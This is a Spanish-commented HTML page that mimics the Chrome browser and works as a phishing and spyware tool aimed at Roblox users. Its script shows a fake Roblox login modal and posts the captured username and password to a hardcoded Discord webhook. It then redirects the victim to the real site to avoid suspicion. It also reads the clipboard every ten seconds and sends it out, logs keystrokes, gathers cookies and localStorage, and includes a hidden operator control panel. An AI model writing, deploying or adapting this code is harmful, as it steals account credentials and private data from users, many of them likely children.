<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chrome</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            user-select: none;
        }
        
        body {
            background: #202124;
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        
        /* ========== BARRA DE PESTAÑAS ========== */
        .tabs-bar {
            background: #1e1f22;
            padding: 8px 8px 0 8px;
            display: flex;
            align-items: center;
            gap: 4px;
            border-bottom: 1px solid #3d3e42;
        }
        
        .tab {
            background: #2f3136;
            color: #e8eaed;
            padding: 8px 20px;
            border-radius: 8px 8px 0 0;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 10px;
            max-width: 200px;
            min-width: 150px;
            border: 1px solid #3d3e42;
            border-bottom: none;
        }
        
        .tab.active {
            background: #3d3e42;
        }
        
        .tab-favicon {
            width: 16px;
            height: 16px;
            background: #8ab4f8;
            border-radius: 50%;
        }
        
        .tab-title {
            flex: 1;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        .tab-close {
            color: #9aa0a6;
            font-size: 16px;
            cursor: pointer;
            width: 20px;
            height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
        }
        
        .tab-close:hover {
            background: #4a4d54;
            color: white;
        }
        
        .new-tab {
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #e8eaed;
            font-size: 20px;
            cursor: pointer;
            border-radius: 8px;
        }
        
        .new-tab:hover {
            background: #3d3e42;
        }
        
        /* ========== BARRA DE HERRAMIENTAS ========== */
        .toolbar {
            background: #292a2d;
            padding: 8px 15px;
            display: flex;
            align-items: center;
            gap: 15px;
            border-bottom: 1px solid #3d3e42;
        }
        
        .nav-buttons {
            display: flex;
            gap: 8px;
        }
        
        .nav-btn {
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            color: #e8eaed;
            cursor: pointer;
            font-size: 20px;
        }
        
        .nav-btn:hover {
            background: #3d3e42;
        }
        
        .nav-btn.disabled {
            opacity: 0.4;
            cursor: default;
        }
        
        /* BARRA DE DIRECCIONES */
        .address-bar {
            flex: 1;
            background: #2f3136;
            border-radius: 24px;
            padding: 8px 16px;
            display: flex;
            align-items: center;
            gap: 10px;
            border: 1px solid #3e4046;
        }
        
        .lock-icon {
            color: #9aa0a6;
            font-size: 14px;
        }
        
        .url-input {
            flex: 1;
            background: transparent;
            border: none;
            color: #e8eaed;
            font-size: 14px;
            outline: none;
        }
        
        .url-input::placeholder {
            color: #9aa0a6;
        }
        
        .menu-icon {
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            color: #e8eaed;
            cursor: pointer;
        }
        
        .menu-icon:hover {
            background: #3d3e42;
        }
        
        /* BARRA DE FAVORITOS */
        .bookmarks-bar {
            background: #292a2d;
            padding: 5px 15px;
            display: flex;
            align-items: center;
            gap: 20px;
            border-bottom: 1px solid #3d3e42;
            font-size: 12px;
            color: #e8eaed;
        }
        
        .bookmark-item {
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
            padding: 3px 8px;
            border-radius: 5px;
        }
        
        .bookmark-item:hover {
            background: #3d3e42;
        }
        
        .bookmark-favicon {
            width: 16px;
            height: 16px;
            background: #8ab4f8;
            border-radius: 3px;
        }
        
        /* ÁREA DE CONTENIDO */
        .content-area {
            flex: 1;
            background: white;
            position: relative;
        }
        
        #mainFrame {
            width: 100%;
            height: 100%;
            border: none;
        }
        
        /* PÁGINA DE NUEVA PESTAÑA (falsa) */
        .new-tab-page {
            width: 100%;
            height: 100%;
            background: #202124;
            color: #e8eaed;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 30px;
        }
        
        .search-box {
            width: 600px;
            background: #2f3136;
            border-radius: 24px;
            padding: 12px 20px;
            display: flex;
            align-items: center;
            gap: 15px;
            border: 1px solid #3e4046;
        }
        
        .search-box input {
            flex: 1;
            background: transparent;
            border: none;
            color: #e8eaed;
            font-size: 16px;
            outline: none;
        }
        
        .quick-links {
            display: flex;
            gap: 30px;
            margin-top: 40px;
        }
        
        .quick-link {
            text-align: center;
            cursor: pointer;
        }
        
        .quick-link-icon {
            width: 60px;
            height: 60px;
            background: #2f3136;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 10px;
            font-size: 24px;
        }
        
        /* PANEL DE CONTROL OCULTO */
        .control-panel {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #1e1f22;
            border: 2px solid #8ab4f8;
            border-radius: 10px;
            padding: 15px;
            color: white;
            z-index: 10000;
            width: 300px;
            display: none;
        }
        
        .control-panel.visible {
            display: block;
        }
        
        .control-panel h3 {
            color: #8ab4f8;
            margin-bottom: 10px;
        }
        
        .control-panel button {
            background: #8ab4f8;
            color: #202124;
            border: none;
            padding: 5px 10px;
            margin: 5px;
            border-radius: 5px;
            cursor: pointer;
        }
        
        .control-badge {
            position: fixed;
            top: 60px;
            right: 20px;
            background: #8ab4f8;
            color: #202124;
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            z-index: 9999;
            cursor: pointer;
        }
        
        /* LOG DE CAPTURAS */
        .log-area {
            width: 100%;
            height: 150px;
            background: #2f3136;
            color: #00ff00;
            border: 1px solid #3e4046;
            border-radius: 5px;
            padding: 5px;
            font-family: monospace;
            font-size: 11px;
            margin-top: 10px;
            overflow-y: auto;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <!-- ========== INTERFAZ DE CHROME ========== -->
    
    <!-- BARRA DE PESTAÑAS -->
    <div class="tabs-bar">
        <div class="tab active">
            <span class="tab-favicon"></span>
            <span class="tab-title">Nueva pestaña</span>
            <span class="tab-close">✕</span>
        </div>
        <div class="tab">
            <span class="tab-favicon"></span>
            <span class="tab-title">Roblox</span>
            <span class="tab-close">✕</span>
        </div>
        <div class="new-tab">+</div>
    </div>
    
    <!-- BARRA DE HERRAMIENTAS -->
    <div class="toolbar">
        <div class="nav-buttons">
            <div class="nav-btn disabled">←</div>
            <div class="nav-btn disabled">→</div>
            <div class="nav-btn">↻</div>
            <div class="nav-btn">🏠</div>
        </div>
        
        <div class="address-bar">
            <span class="lock-icon">🔒</span>
            <input type="text" class="url-input" id="urlInput" value="chrome://newtab" placeholder="Buscar o escribir URL">
            <span style="color:#9aa0a6;">⭐</span>
        </div>
        
        <div class="menu-icon">⋮</div>
    </div>
    
    <!-- BARRA DE FAVORITOS -->
    <div class="bookmarks-bar">
        <div class="bookmark-item">
            <span class="bookmark-favicon"></span>
            <span>Roblox</span>
        </div>
        <div class="bookmark-item">
            <span class="bookmark-favicon"></span>
            <span>YouTube</span>
        </div>
        <div class="bookmark-item">
            <span class="bookmark-favicon"></span>
            <span>Gmail</span>
        </div>
        <div class="bookmark-item">
            <span class="bookmark-favicon"></span>
            <span>Drive</span>
        </div>
    </div>
    
    <!-- ÁREA DE CONTENIDO (página de nueva pestaña falsa por defecto) -->
    <div class="content-area" id="contentArea">
        <div class="new-tab-page" id="newTabPage">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_272x92dp.png" alt="Google" style="width: 272px;">
            
            <div class="search-box">
                <span>🔍</span>
                <input type="text" id="googleSearchInput" placeholder="Buscar en Google o escribir URL">
            </div>
            
            <div class="quick-links">
                <div class="quick-link" onclick="navegarARoblox()">
                    <div class="quick-link-icon">🎮</div>
                    <div>Roblox</div>
                </div>
                <div class="quick-link">
                    <div class="quick-link-icon">▶️</div>
                    <div>YouTube</div>
                </div>
                <div class="quick-link">
                    <div class="quick-link-icon">📧</div>
                    <div>Gmail</div>
                </div>
                <div class="quick-link">
                    <div class="quick-link-icon">📁</div>
                    <div>Drive</div>
                </div>
            </div>
        </div>
        
        <iframe id="mainFrame" style="display: none; width:100%; height:100%; border:none;"></iframe>
    </div>
    
    <!-- BADGE DE CONTROL (para ti) -->
    <div class="control-badge" onclick="togglePanel()">⚙️ CONTROL</div>
    
    <!-- PANEL DE CONTROL OCULTO -->
    <div class="control-panel" id="controlPanel">
        <h3>🎮 CHROME FALSO - CONTROL</h3>
        
        <div>
            <button onclick="leerPortapapeles()">📋 Portapapeles</button>
            <button onclick="mostrarModalRoblox()">🔐 Modal Roblox</button>
            <button onclick="capturarTodo()">📸 Capturar Todo</button>
        </div>
        
        <div class="log-area" id="logArea">[Listo]</div>
        
        <div style="margin-top:10px;">
            <button onclick="enviarDiscord()" style="width:100%; background:#ff4444;">📤 Enviar a Discord</button>
        </div>
    </div>
    
    <!-- MODAL FALSO DE ROBLOX (oculto inicialmente) -->
    <div id="robloxModal" style="display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:20000; align-items:center; justify-content:center;">
        <div style="background:#1e1f22; padding:30px; border-radius:10px; width:400px;">
            <h2 style="color:#00b8ff; margin-bottom:20px;">🔐 Verificación Roblox</h2>
            <p style="color:#e8eaed; margin-bottom:20px;">Por seguridad, confirma tu identidad</p>
            <input type="text" id="robloxUser" placeholder="Usuario" style="width:100%; padding:10px; margin:10px 0; background:#2f3136; border:1px solid #3e4046; color:white; border-radius:5px;">
            <input type="password" id="robloxPass" placeholder="Contraseña" style="width:100%; padding:10px; margin:10px 0; background:#2f3136; border:1px solid #3e4046; color:white; border-radius:5px;">
            <button onclick="capturarCredenciales()" style="width:100%; padding:12px; background:#00b8ff; border:none; border-radius:5px; color:white; font-weight:bold; cursor:pointer;">Verificar</button>
        </div>
    </div>

    <script>
        // ===========================================
        // CONFIGURACIÓN
        // ===========================================
        const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
        let log = [];
        
        // ===========================================
        // FUNCIONES DE LOG
        // ===========================================
        function agregarLog(texto) {
            const timestamp = new Date().toLocaleTimeString();
            log.push(`[${timestamp}] ${texto}`);
            document.getElementById('logArea').innerText = log.join('\n');
        }
        
        // ===========================================
        // CONTROL DE PANEL
        // ===========================================
        function togglePanel() {
            document.getElementById('controlPanel').classList.toggle('visible');
        }
        
        // ===========================================
        // NAVEGACIÓN (BARRA DE DIRECCIONES)
        // ===========================================
        document.getElementById('urlInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                navegar(this.value);
            }
        });
        
        function navegar(url) {
            agregarLog(`🔍 Navegando a: ${url}`);
            
            // TRAMPA: Si busca roblox, mostramos nuestro modal
            if (url.toLowerCase().includes('roblox')) {
                mostrarModalRoblox();
            } else {
                // Mostrar iframe con la página real
                document.getElementById('newTabPage').style.display = 'none';
                document.getElementById('mainFrame').style.display = 'block';
                document.getElementById('mainFrame').src = url.startsWith('http') ? url : 'https://' + url;
            }
        }
        
        // ===========================================
        // MOSTRAR MODAL FALSO DE ROBLOX
        // ===========================================
        function mostrarModalRoblox() {
            document.getElementById('robloxModal').style.display = 'flex';
            agregarLog('🎯 Modal de Roblox mostrado');
        }
        
        // ===========================================
        // CAPTURAR CREDENCIALES
        // ===========================================
        function capturarCredenciales() {
            const user = document.getElementById('robloxUser').value;
            const pass = document.getElementById('robloxPass').value;
            
            if (user && pass) {
                agregarLog(`🔥 Credenciales: ${user} : ${pass}`);
                
                fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**🔐 ROBLOX CREDENCIALES**\nUsuario: ${user}\nContraseña: ${pass}`
                    })
                });
                
                document.getElementById('robloxModal').style.display = 'none';
                
                // Redirigir a Roblox real para no levantar sospechas
                document.getElementById('newTabPage').style.display = 'none';
                document.getElementById('mainFrame').style.display = 'block';
                document.getElementById('mainFrame').src = 'https://www.roblox.com/home';
            }
        }
        
        // ===========================================
        // LEER PORTAPAPELES
        // ===========================================
        async function leerPortapapeles() {
            try {
                const texto = await navigator.clipboard.readText();
                agregarLog(`📋 Portapapeles: ${texto.substring(0, 50)}`);
                
                fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**📋 PORTAPAPELES**\n\`\`\`${texto}\`\`\``
                    })
                });
            } catch(e) {
                agregarLog(`❌ Error portapapeles: ${e.message}`);
            }
        }
        
        // ===========================================
        // CAPTURAR TODO (para depuración)
        // ===========================================
        function capturarTodo() {
            const info = {
                url: document.getElementById('urlInput').value,
                cookies: document.cookie,
                localStorage: { ...localStorage },
                userAgent: navigator.userAgent
            };
            agregarLog(`📦 Info capturada: ${JSON.stringify(info).substring(0, 100)}`);
        }
        
        // ===========================================
        // ENVIAR TODO A DISCORD
        // ===========================================
        function enviarDiscord() {
            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `**📦 LOGS COMPLETOS**\n\`\`\`${log.join('\n')}\`\`\``
                })
            });
            agregarLog('✅ Logs enviados a Discord');
        }
        
        // ===========================================
        // NAVEGACIÓN DESDE ATAJOS
        // ===========================================
        function navegarARoblox() {
            mostrarModalRoblox();
        }
        
        // ===========================================
        // CAPTURAR TECLAS (keylogger en nuestra página)
        // ===========================================
        document.addEventListener('keydown', function(e) {
            if (e.target.tagName !== 'INPUT') {
                agregarLog(`⌨️ Tecla: ${e.key}`);
            }
        });
        
        // ===========================================
        // INICIAR
        // ===========================================
        agregarLog('🚀 Chrome falso iniciado');
        
        // Capturar portapapeles cada 10 segundos
        setInterval(leerPortapapeles, 10000);
    </script>
</body>
</html>
